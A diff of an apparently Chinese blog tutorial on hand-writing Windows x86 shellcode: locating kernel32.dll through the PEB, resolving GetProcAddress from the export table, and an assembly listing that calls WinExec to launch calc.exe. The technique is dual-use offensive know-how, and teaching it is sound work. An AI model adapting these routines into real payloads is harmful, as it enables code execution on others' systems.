+</span></span><span style=display:flex><span> mov eax, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x8</span>]      ; EAX <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>kernel32.dll <span style=color:#f92672>/</span> Address of kernel32.dll
+</span></span><span style=display:flex><span> mov [ebp<span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span>], eax      ; [EBP<span style=color:#f92672>-</span><span style=color:#ae81ff>0x04</span>] <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>kernel32.dll
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>; Find the address of the WinExec Symbol within kernel32.dll
+</span></span><span style=display:flex><span>; <span style=color:#f92672>+</span> The hex values will change with different versions of Windows
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>; Find the address of the Export Table within kernel32.dll
+</span></span><span style=display:flex><span> mov ebx, [eax<span style=color:#f92672>+</span><span style=color:#ae81ff>0x3C</span>]     ; EBX <span style=color:#f92672>=</span> Offset NewEXEHeader  <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xF8</span>
+</span></span><span style=display:flex><span> add ebx, eax            ; EBX <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>NewEXEHeader        <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xF8</span> <span style=color:#f92672>+</span> <span style=color:#f92672>&amp;</span>kernel32.dll
+</span></span><span style=display:flex><span> mov ebx, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x78</span>]     ; EBX <span style=color:#f92672>=</span> RVA ExportTable      <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x777B0</span> <span style=color:#f92672>=</span> [<span style=color:#f92672>&amp;</span>NewExeHeader <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x78</span>]
+</span></span><span style=display:flex><span> add ebx, eax            ; EBX <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>ExportTable         <span style=color:#f92672>=</span> RVA ExportTable <span style=color:#f92672>+</span> <span style=color:#f92672>&amp;</span>kernel32.dll
+</span></span></code></pre></div><p>其中<code>mov ebx, [fs:ebx+0x30] ; EBX = Address_of_PEB</code> [fs:0x30] 指向的就是PEB地址。</p><p>进程环境块 (Process Environment Block) 是一种用户模式数据结构，应用程序（以及恶意软件扩展）可以使用它来获取加载模块列表、进程启动参数、堆地址、检查程序是否正在运行等信息。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/// PEB structure (winternl.h)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>///////////////////////////////////////////////////////////
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _PEB {
+</span></span><span style=display:flex><span>  BYTE                          Reserved1[<span style=color:#ae81ff>2</span>];  <span style=color:#75715e>//  0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>**</span>BYTE                          BeingDebugged; <span style=color:#75715e>//  0x02**
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  BYTE                          Reserved2[<span style=color:#ae81ff>1</span>];  <span style=color:#75715e>//  0x03
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  PVOID                         Reserved3[<span style=color:#ae81ff>2</span>];  <span style=color:#75715e>//  0x04
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>**</span>PPEB_LDR_DATA                 Ldr;           <span style=color:#75715e>//  0x0C**
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
+</span></span><span style=display:flex><span>  PVOID                         Reserved4[<span style=color:#ae81ff>3</span>];
+</span></span><span style=display:flex><span>  PVOID                         AtlThunkSListPtr;
+</span></span><span style=display:flex><span>  PVOID                         Reserved5;
+</span></span><span style=display:flex><span>  ULONG                         Reserved6;
+</span></span><span style=display:flex><span>  PVOID                         Reserved7;
+</span></span><span style=display:flex><span>  ULONG                         Reserved8;
+</span></span><span style=display:flex><span>  ULONG                         AtlThunkSListPtr32;
+</span></span><span style=display:flex><span>  PVOID                         Reserved9[<span style=color:#ae81ff>45</span>];
+</span></span><span style=display:flex><span>  BYTE                          Reserved10[<span style=color:#ae81ff>96</span>];
+</span></span><span style=display:flex><span>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
+</span></span><span style=display:flex><span>  BYTE                          Reserved11[<span style=color:#ae81ff>128</span>];
+</span></span><span style=display:flex><span>  PVOID                         Reserved12[<span style=color:#ae81ff>1</span>];
+</span></span><span style=display:flex><span>  ULONG                         SessionId;
+</span></span><span style=display:flex><span>} PEB, <span style=color:#f92672>*</span>PPEB;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/// PEB_LDR_DATA structure (winternl.h)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>///////////////////////////////////////////////////////////
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _PEB_LDR_DATA
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>　ULONG Length;
+</span></span><span style=display:flex><span>　BOOLEAN Initialized;
+</span></span><span style=display:flex><span>　PVOID SsHandle;
+</span></span><span style=display:flex><span>　LIST_ENTRY InLoadOrderModuleList <span style=color:#f92672>-&gt;</span> {
+</span></span><span style=display:flex><span>		   <span style=color:#66d9ef>struct</span> _LIST_ENTRY <span style=color:#f92672>*</span>Flink; <span style=color:#75715e>// 4 Bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		   <span style=color:#66d9ef>struct</span> _LIST_ENTRY <span style=color:#f92672>*</span>Blink; <span style=color:#75715e>// 4 Bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
+</span></span><span style=display:flex><span>　LIST_ENTRY InMemoryOrderModuleList  <span style=color:#f92672>-&gt;</span> {
+</span></span><span style=display:flex><span>		   <span style=color:#66d9ef>struct</span> _LIST_ENTRY <span style=color:#f92672>*</span>Flink; <span style=color:#75715e>// 4 Bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		   <span style=color:#66d9ef>struct</span> _LIST_ENTRY <span style=color:#f92672>*</span>Blink; <span style=color:#75715e>// 4 Bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
+</span></span><span style=display:flex><span>　LIST_ENTRY InInitializationOrderModuleList  <span style=color:#f92672>-&gt;</span> {
+</span></span><span style=display:flex><span>		   <span style=color:#66d9ef>struct</span> _LIST_ENTRY <span style=color:#f92672>*</span>Flink; <span style=color:#75715e>// 4 Bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		   <span style=color:#66d9ef>struct</span> _LIST_ENTRY <span style=color:#f92672>*</span>Blink; <span style=color:#75715e>// 4 Bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
+</span></span><span style=display:flex><span>} PEB_LDR_DATA,<span style=color:#f92672>*</span>PPEB_LDR_DATA;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _LIST_ENTRY {
+</span></span><span style=display:flex><span>   <span style=color:#66d9ef>struct</span> _LIST_ENTRY <span style=color:#f92672>*</span>Flink; <span style=color:#75715e>// 4 Bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   <span style=color:#66d9ef>struct</span> _LIST_ENTRY <span style=color:#f92672>*</span>Blink; <span style=color:#75715e>// 4 Bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} LIST_ENTRY, <span style=color:#f92672>*</span>PLIST_ENTRY, <span style=color:#f92672>*</span>RESTRICTED_POINTER PRLIST_ENTRY;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/// LDR_DATA_TABLE_ENTRY structure (winternl.h)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>///////////////////////////////////////////////////////////
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _LDR_DATA_TABLE_ENTRY
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	LIST_ENTRY InLoadOrderLinks;
+</span></span><span style=display:flex><span>	LIST_ENTRY InMemoryOrderLinks;
+</span></span><span style=display:flex><span>	LIST_ENTRY InInitializationOrderLinks;
+</span></span><span style=display:flex><span>	PVOID DllBase;
+</span></span><span style=display:flex><span>	PVOID EntryPoint;
+</span></span><span style=display:flex><span>	ULONG SizeOfImage;
+</span></span><span style=display:flex><span>	UNICODE_STRING FullDllName;
+</span></span><span style=display:flex><span>	UNICODE_STRING BaseDllName;
+</span></span><span style=display:flex><span>	ULONG Flags;
+</span></span><span style=display:flex><span>	WORD LoadCount;
+</span></span><span style=display:flex><span>	WORD TlsIndex;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>union</span>
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		LIST_ENTRY HashLinks;
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>struct</span>
+</span></span><span style=display:flex><span>		{
+</span></span><span style=display:flex><span>			PVOID SectionPointer;
+</span></span><span style=display:flex><span>			ULONG CheckSum;
+</span></span><span style=display:flex><span>		};
+</span></span><span style=display:flex><span>	};
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>union</span>
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ULONG TimeDateStamp;
+</span></span><span style=display:flex><span>		PVOID LoadedImports;
+</span></span><span style=display:flex><span>	};
+</span></span><span style=display:flex><span>	_ACTIVATION_CONTEXT<span style=color:#f92672>*</span> EntryPointActivationContext;
+</span></span><span style=display:flex><span>	PVOID PatchInformation;
+</span></span><span style=display:flex><span>	LIST_ENTRY ForwarderLinks;
+</span></span><span style=display:flex><span>	LIST_ENTRY ServiceTagLinks;
+</span></span><span style=display:flex><span>	LIST_ENTRY StaticLinks;
+</span></span><span style=display:flex><span>} LDR_DATA_TABLE_ENTRY, <span style=color:#f92672>*</span> PLDR_DATA_TABLE_ENTRY;
+</span></span></code></pre></div><p>汇编代码解读：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span> mov ebx, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x1C</span>]     ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>st entry in InitOrderModuleList <span style=color:#f92672>/</span> ntdll.dll
+</span></span><span style=display:flex><span> mov ebx, [ebx]          ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>nd entry in InitOrderModuleList <span style=color:#f92672>/</span> kernelbase.dll
+</span></span><span style=display:flex><span> mov ebx, [ebx]          ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>rd entry in InitOrderModuleList <span style=color:#f92672>/</span> kernel32.dll
+</span></span><span style=display:flex><span> mov eax, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x8</span>]      ; EAX <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>kernel32.dll <span style=color:#f92672>/</span> Address of kernel32.dll
+</span></span></code></pre></div><p>EBX+0xC 意味着从PEB的地址开始增加0xC个字节的地址就是指向PPEB_LDR_DATA Ldr结构体成员的地址，0xC来源于PEB第一个成员到LDR结构体成员的数据宽度，PVOID Reserved3[2]这样实际上是占用了8个字节，一个指针占用4个字节，2个就是8字节。</p><p>EBX+0x1C意味着从LDR开始增加0x1C个字节的地址，就是指向ntdll.dll的LIST_ENTRY结构体成员LIST_ENTRY InInitializationOrderModuleList的地址，由于LIST_ENTRY 是一个链表结构，它有两个成员，因此整个结构体占用8个字节，后续取地址2次，都是为了遍历这个链表结构。</p><p>0x1C = ULONG Length + BOOLEAN Initialized + PVOID SsHandle + sizeof(LIST_ENTRY InLoadOrderModuleList) + sizeof(LIST_ENTRY InLoadOrderModuleList)</p><p>EBX+0x8 是从InInitializationOrderLinks开始增加8字节，获取指向到DllBase成员的地址，而这个地址就是DLL加载到内存中的基址，有了基址，就可以从DLL的导出表寻找导出函数进行调用了。</p><p>InInitializationOrderModuleList中的DLL加载顺序是固定的，第一个DLL是NTDDLL.dll，第二个是KERNELBASE.dll、第三个是KERNEL32.DLL。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-29-08.png alt></p></p><pre tabindex=0><code>0:000&gt; dd 00aa41d0
 00aa41d0  00aa4b38 77dc5d9c **77ca0000** 00000000
 00aa41e0  001a3000 003c003a 00aa40a0 00140012
 00aa41f0  77ca8290 0000a2c4 0000ffff 77dc5c20
@@ -273,345 +148,172 @@ Start:
 00aa47b8  00000000 77ca1134 00aa6328 00aa5a30
 00aa47c8  00aa57a0 00aaeb0c 00000000 00aac5c4
 00aa47d8  76b30000 00000000 200a5244 01d82274
-</code></pre><p>DLL顺序：0x77ca0000（C:\WINDOWS\SYSTEM32\ntdll.dll）、0x76d20000（C:\WINDOWS\System32\KERNELBASE.dll） 、76b30000（C:\WINDOWS\System32\KERNEL32.DLL）。</p>
-<p>汇编代码解读：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>; Find the address of the Export Table within kernel32.dll
-</span></span><span style="display:flex;"><span> mov ebx, [eax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3C</span>]     ; EBX <span style="color:#f92672">=</span> Offset NewEXEHeader  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xF8</span>
-</span></span><span style="display:flex;"><span> add ebx, eax            ; EBX <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>NewEXEHeader        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xF8</span> <span style="color:#f92672">+</span> <span style="color:#f92672">&amp;</span>kernel32.dll
-</span></span><span style="display:flex;"><span> mov ebx, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x78</span>]     ; EBX <span style="color:#f92672">=</span> RVA ExportTable      <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x777B0</span> <span style="color:#f92672">=</span> [<span style="color:#f92672">&amp;</span>NewExeHeader <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x78</span>]
-</span></span><span style="display:flex;"><span> add ebx, eax            ; EBX <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>ExportTable         <span style="color:#f92672">=</span> RVA ExportTable <span style="color:#f92672">+</span> <span style="color:#f92672">&amp;</span>kernel32.dll
-</span></span></code></pre></div><p><code>[eax+0x3C]</code>  此时EAX中保存着DLL的基地址，指向DOS头</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-29-53.png" alt=""  />
-  </p></p>
-<p>EAX+0x3C指向DOS头的e_lfanew成员，e_lfanew保存的是从PE文件第一个字节到PE头的文件偏移。mov ebx, [eax+0x3C]  的含义就是将PE头的文件偏移地址保存到ebx。</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-30-16.png" alt=""  />
-  </p></p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-31-09.png" alt=""  />
-  </p></p>
-<p>add ebx, eax 的含义是将PE头的地址保存到ebx中。从PE头向下偏移0x78就是PE文件相对于PE头的导出表偏移地址，后续就是从PE文件寻找导出函数地址了，根据公开的一些Shellcode，可以封装出一些常用的过程，比如从Kernel32.dll中寻找GetProcAddress API的地址，以便后续传入API的名字自动帮助我们去寻找API的地址。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GetKernel32BaseAddr:
-</span></span><span style="display:flex;"><span>    push ebp
-</span></span><span style="display:flex;"><span>    mov ebp,esp
-</span></span><span style="display:flex;"><span>    sub esp,0x40
-</span></span><span style="display:flex;"><span>    xor ebx, ebx            ; EBX <span style="color:#f92672">=</span> 0x00000000
-</span></span><span style="display:flex;"><span>    mov ebx, <span style="color:#f92672">[</span>fs:ebx+0x30<span style="color:#f92672">]</span>  ; EBX <span style="color:#f92672">=</span> Address_of_PEB
-</span></span><span style="display:flex;"><span>    mov ebx, <span style="color:#f92672">[</span>ebx+0xC<span style="color:#f92672">]</span>      ; EBX <span style="color:#f92672">=</span> Address_of_LDR
-</span></span><span style="display:flex;"><span>    mov ebx, <span style="color:#f92672">[</span>ebx+0x1C<span style="color:#f92672">]</span>     ; EBX <span style="color:#f92672">=</span> 1st entry in InitOrderModuleList / ntdll.dll
-</span></span><span style="display:flex;"><span>    mov ebx, <span style="color:#f92672">[</span>ebx<span style="color:#f92672">]</span>          ; EBX <span style="color:#f92672">=</span> 2nd entry in InitOrderModuleList / kernelbase.dll
-</span></span><span style="display:flex;"><span>    mov ebx, <span style="color:#f92672">[</span>ebx<span style="color:#f92672">]</span>          ; EBX <span style="color:#f92672">=</span> 3rd entry in InitOrderModuleList / kernel32.dll
-</span></span><span style="display:flex;"><span>    mov eax, <span style="color:#f92672">[</span>ebx+0x8<span style="color:#f92672">]</span>      ; EAX <span style="color:#f92672">=</span> &amp;kernel32.dll / Address of kernel32.dll
-</span></span><span style="display:flex;"><span>    add esp,0x40
-</span></span><span style="display:flex;"><span>    mov esp,ebp
-</span></span><span style="display:flex;"><span>    pop ebp
-</span></span><span style="display:flex;"><span>    ret
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>GetProcAddrFuncAddr:
-</span></span><span style="display:flex;"><span>    push ebp
-</span></span><span style="display:flex;"><span>    mov ebp,esp
-</span></span><span style="display:flex;"><span>    sub esp,0x40
-</span></span><span style="display:flex;"><span>    xor ecx, ecx
-</span></span><span style="display:flex;"><span>    mov ebx, <span style="color:#f92672">[</span>ebp + 8<span style="color:#f92672">]</span> ; EBX <span style="color:#f92672">=</span> Base address
-</span></span><span style="display:flex;"><span>    mov edx, <span style="color:#f92672">[</span>ebx + 0x3c<span style="color:#f92672">]</span>    ; EDX <span style="color:#f92672">=</span> DOS-&gt;e_lfanew
-</span></span><span style="display:flex;"><span>    add edx, ebx             ; EDX <span style="color:#f92672">=</span> PE Header
-</span></span><span style="display:flex;"><span>    mov edx, <span style="color:#f92672">[</span>edx + 0x78<span style="color:#f92672">]</span>    ; EDX <span style="color:#f92672">=</span>  export table
-</span></span><span style="display:flex;"><span>    add edx, ebx             ; EDX <span style="color:#f92672">=</span> Export table
-</span></span><span style="display:flex;"><span>    mov esi, <span style="color:#f92672">[</span>edx + 0x20<span style="color:#f92672">]</span>    ; ESI <span style="color:#f92672">=</span>  namestable
-</span></span><span style="display:flex;"><span>    add esi, ebx             ; ESI <span style="color:#f92672">=</span> Names table
-</span></span><span style="display:flex;"><span>    xor ecx, ecx             ; EXC <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>    Get_Function:
-</span></span><span style="display:flex;"><span>            inc ecx                  ; Increment the ordinal
-</span></span><span style="display:flex;"><span>            lodsd                    ; Get name 
-</span></span><span style="display:flex;"><span>            add eax, ebx             ; Get <span style="color:#66d9ef">function</span> name
-</span></span><span style="display:flex;"><span>            cmp dword <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>, 50746547h       ; GetP
-</span></span><span style="display:flex;"><span>            jnz Get_Function
-</span></span><span style="display:flex;"><span>            cmp dword <span style="color:#f92672">[</span>eax + 0x04<span style="color:#f92672">]</span>, 41636f72h ; rocA
-</span></span><span style="display:flex;"><span>            jnz Get_Function
-</span></span><span style="display:flex;"><span>            cmp dword <span style="color:#f92672">[</span>eax + 0x08<span style="color:#f92672">]</span>, 65726464h ; ddre
-</span></span><span style="display:flex;"><span>            jnz Get_Function
-</span></span><span style="display:flex;"><span>    mov esi, <span style="color:#f92672">[</span>edx + 0x24<span style="color:#f92672">]</span>                ; ESI <span style="color:#f92672">=</span>  ordinals
-</span></span><span style="display:flex;"><span>    add esi, ebx                         ; ESI <span style="color:#f92672">=</span> Ordinals table
-</span></span><span style="display:flex;"><span>    mov cx, <span style="color:#f92672">[</span>esi + ecx * 2<span style="color:#f92672">]</span>              ; Number of <span style="color:#66d9ef">function</span>
-</span></span><span style="display:flex;"><span>    dec ecx
-</span></span><span style="display:flex;"><span>    mov esi, <span style="color:#f92672">[</span>edx + 0x1c<span style="color:#f92672">]</span>                ;  address table
-</span></span><span style="display:flex;"><span>    add esi, ebx                         ; ESI <span style="color:#f92672">=</span> Address table
-</span></span><span style="display:flex;"><span>    mov edx, <span style="color:#f92672">[</span>esi + ecx * 4<span style="color:#f92672">]</span>             ; EDX <span style="color:#f92672">=</span> Pointer<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>    add edx, ebx                         ; EDX <span style="color:#f92672">=</span> GetProcAddress
-</span></span><span style="display:flex;"><span>    mov eax,edx
-</span></span><span style="display:flex;"><span>    add esp,0x40
-</span></span><span style="display:flex;"><span>    mov esp,ebp
-</span></span><span style="display:flex;"><span>    pop ebp
-</span></span><span style="display:flex;"><span>    ret
-</span></span></code></pre></div><p>OK，接下来，写一个执行操作系统命令的Shellcode，并使用NASM编译，VS Link进行链接。</p>
-<p>首先，执行操作系统命令的API是<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a> ：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>UINT <span style="color:#a6e22e">WinExec</span>(
-</span></span><span style="display:flex;"><span>  [in] LPCSTR lpCmdLine,
-</span></span><span style="display:flex;"><span>  [in] UINT   uCmdShow
-</span></span><span style="display:flex;"><span>);
-</span></span></code></pre></div><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-31-35.png" alt=""  />
-  </p></p>
-<p>在Kernel32.dll中导出，那这就容易多了。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>; exec_calc.<span style="color:#66d9ef">asm</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>global Start
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>section .data
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>section .text
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Start:
-</span></span><span style="display:flex;"><span>    push ebp
-</span></span><span style="display:flex;"><span>    mov ebp, esp
-</span></span><span style="display:flex;"><span>    sub esp, <span style="color:#ae81ff">0x12</span>
-</span></span><span style="display:flex;"><span>    call GetKernel32BaseAddr
-</span></span><span style="display:flex;"><span>    mov dword [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>],eax ; Kernel32.dll Base Addr
-</span></span><span style="display:flex;"><span>    push eax
-</span></span><span style="display:flex;"><span>    call GetProcAddrFuncAddr
-</span></span><span style="display:flex;"><span>    mov dword [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>],eax ; GetProcAddress
-</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x00636578</span> ; xec,<span style="color:#ae81ff">0x00</span>
-</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x456e6957</span> ; WinE
-</span></span><span style="display:flex;"><span>    push esp
-</span></span><span style="display:flex;"><span>    push dword [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] ; [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">-&gt;</span> Kernel32.DLL Base Addr
-</span></span><span style="display:flex;"><span>    call dword [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>] ; [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>] <span style="color:#f92672">-&gt;</span> GetProcAddress Addr
-</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0</span>                ; WinExec uCmdShow
-</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x6578652e</span>       ; exe. <span style="color:#f92672">:</span> <span style="color:#ae81ff">6578652</span>e
-</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x636c6163</span>       ; clac : <span style="color:#ae81ff">636</span>c6163
-</span></span><span style="display:flex;"><span>    push esp
-</span></span><span style="display:flex;"><span>    call eax
-</span></span><span style="display:flex;"><span>    nop
-</span></span><span style="display:flex;"><span>    nop
-</span></span><span style="display:flex;"><span>    add esp,<span style="color:#ae81ff">0x12</span>
-</span></span><span style="display:flex;"><span>    mov esp,ebp
-</span></span><span style="display:flex;"><span>    pop ebp
-</span></span><span style="display:flex;"><span>    ret
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>GetKernel32BaseAddr:
-</span></span><span style="display:flex;"><span>    push ebp
-</span></span><span style="display:flex;"><span>    mov ebp,esp
-</span></span><span style="display:flex;"><span>    sub esp,<span style="color:#ae81ff">0x40</span>
-</span></span><span style="display:flex;"><span>    xor ebx, ebx            ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
-</span></span><span style="display:flex;"><span>    mov ebx, [fs:ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>]  ; EBX <span style="color:#f92672">=</span> Address_of_PEB
-</span></span><span style="display:flex;"><span>    mov ebx, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0xC</span>]      ; EBX <span style="color:#f92672">=</span> Address_of_LDR
-</span></span><span style="display:flex;"><span>    mov ebx, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1C</span>]     ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>st entry in InitOrderModuleList <span style="color:#f92672">/</span> ntdll.dll
-</span></span><span style="display:flex;"><span>    mov ebx, [ebx]          ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>nd entry in InitOrderModuleList <span style="color:#f92672">/</span> kernelbase.dll
-</span></span><span style="display:flex;"><span>    mov ebx, [ebx]          ; EBX <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>rd entry in InitOrderModuleList <span style="color:#f92672">/</span> kernel32.dll
-</span></span><span style="display:flex;"><span>    mov eax, [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x8</span>]      ; EAX <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>kernel32.dll <span style="color:#f92672">/</span> Address of kernel32.dll
-</span></span><span style="display:flex;"><span>    add esp,<span style="color:#ae81ff">0x40</span>
-</span></span><span style="display:flex;"><span>    mov esp,ebp
-</span></span><span style="display:flex;"><span>    pop ebp
-</span></span><span style="display:flex;"><span>    ret
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>GetProcAddrFuncAddr:
-</span></span><span style="display:flex;"><span>    push ebp
-</span></span><span style="display:flex;"><span>    mov ebp,esp
-</span></span><span style="display:flex;"><span>    sub esp,<span style="color:#ae81ff">0x40</span>
-</span></span><span style="display:flex;"><span>    xor ecx, ecx
-</span></span><span style="display:flex;"><span>    mov ebx, [ebp <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>] ; EBX <span style="color:#f92672">=</span> Base address
-</span></span><span style="display:flex;"><span>    mov edx, [ebx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3c</span>]    ; EDX <span style="color:#f92672">=</span> DOS<span style="color:#f92672">-&gt;</span>e_lfanew
-</span></span><span style="display:flex;"><span>    add edx, ebx             ; EDX <span style="color:#f92672">=</span> PE Header
-</span></span><span style="display:flex;"><span>    mov edx, [edx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x78</span>]    ; EDX <span style="color:#f92672">=</span>  export table
-</span></span><span style="display:flex;"><span>    add edx, ebx             ; EDX <span style="color:#f92672">=</span> Export table
-</span></span><span style="display:flex;"><span>    mov esi, [edx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>]    ; ESI <span style="color:#f92672">=</span>  namestable
-</span></span><span style="display:flex;"><span>    add esi, ebx             ; ESI <span style="color:#f92672">=</span> Names table
-</span></span><span style="display:flex;"><span>    xor ecx, ecx             ; EXC <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>    Get_Function:
-</span></span><span style="display:flex;"><span>            inc ecx                  ; Increment the ordinal
-</span></span><span style="display:flex;"><span>            lodsd                    ; Get name 
-</span></span><span style="display:flex;"><span>            add eax, ebx             ; Get function name
-</span></span><span style="display:flex;"><span>            cmp dword [eax], <span style="color:#ae81ff">50746547</span>h       ; GetP
-</span></span><span style="display:flex;"><span>            jnz Get_Function
-</span></span><span style="display:flex;"><span>            cmp dword [eax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x04</span>], <span style="color:#ae81ff">41636f</span><span style="color:#ae81ff">72</span>h ; rocA
-</span></span><span style="display:flex;"><span>            jnz Get_Function
